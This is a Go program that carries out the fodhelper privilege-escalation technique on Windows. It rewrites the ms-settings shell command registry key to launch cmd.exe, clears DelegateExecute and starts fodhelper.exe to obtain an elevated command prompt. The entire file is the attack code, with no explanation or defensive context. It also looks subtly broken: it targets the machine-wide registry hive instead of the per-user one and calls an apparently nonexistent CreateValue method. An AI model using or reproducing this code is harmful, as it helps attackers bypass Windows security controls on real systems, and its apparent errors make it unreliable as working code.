package main

import (
 "fmt"
 "golang.org/x/sys/windows/registry"
 "log"
 "os/exec"
)

func main() {
 key, err := registry.OpenKey(registry.LOCAL_MACHINE, `SOFTWARE\Classes\ms-settings\Shell\Open\command`, registry.QUERY_VALUE|registry.SET_VALUE)
 if err != nil {
  log.Fatal(err)
 }
 defer key.Close()

 if err := key.SetStringValue("", "cmd.exe"); err != nil {
  log.Fatal(err)
 }
 delegateExecute, _, err := key.GetStringValue("DelegateExecute")
 if err != nil && err != registry.ErrNotExist {
  log.Fatal(err)
 }
 if delegateExecute != "" {
  if err := key.SetStringValue("DelegateExecute", ""); err != nil {
   log.Fatal(err)
  }
 } else {
  if err := key.CreateValue("DelegateExecute", "", registry.STRING); err != nil {
   log.Fatal(err)
  }
 }

 cmd := exec.Command("C:\\Windows\\System32\\fodhelper.exe")
 if err := cmd.Start(); err != nil {
  log.Fatal(err)
 }
 fmt.Println("fodhelper.exe запущен")
}
